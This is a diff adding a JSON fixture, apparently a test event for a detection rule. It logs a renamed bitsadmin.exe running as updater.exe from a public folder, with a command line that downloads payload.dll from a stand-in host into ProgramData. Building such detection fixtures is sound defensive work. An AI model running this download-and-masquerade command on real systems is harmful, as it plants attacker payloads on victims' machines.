@@ -1,0 +1,31 @@
+{
+  "event": {
+    "category": [
+      "process"
+    ],
+    "type": [
+      "start"
+    ],
+    "kind": "event"
+  },
+  "host": {
+    "name": "ws-lab-07",
+    "os": {
+      "type": "windows"
+    }
+  },
+  "user": {
+    "name": "j.doe"
+  },
+  "process": {
+    "name": "updater.exe",
+    "executable": "C:\\Users\\Public\\updater.exe",
+    "command_line": "updater.exe /addfile job2 https://example.invalid/payload.dll C:\\ProgramData\\payload.dll",
+    "pe": {
+      "original_file_name": "bitsadmin.exe"
+    },
+    "parent": {
+      "name": "cmd.exe"
+    }
+  }
+}
